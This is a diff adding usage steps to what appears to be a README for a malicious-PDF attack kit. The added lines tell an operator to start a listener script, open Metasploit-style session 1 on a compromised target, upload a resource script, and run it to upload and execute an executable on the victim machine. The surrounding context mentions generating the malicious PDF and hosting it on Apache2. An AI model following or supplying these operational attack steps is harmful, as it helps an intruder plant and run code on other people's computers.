@@ -38,3 +38,17 @@ Begin by generating the malicious PDF and generate encrypted archive file by gen
     Access the IP and Port that the Apache2 is running on
     
     Activate the listener script to initialize the session
+
+Start listener by running the listener.sh script
+  
+  chmod +x listener.sh
+  
+Upload the upload_exe.rc file to the target machine via session
+  
+  sessions -i 1
+  
+  upload upload_exe.rc
+  
+Run the resource script in order to upload and run the executable
+  
+  resource upload_exe.rc
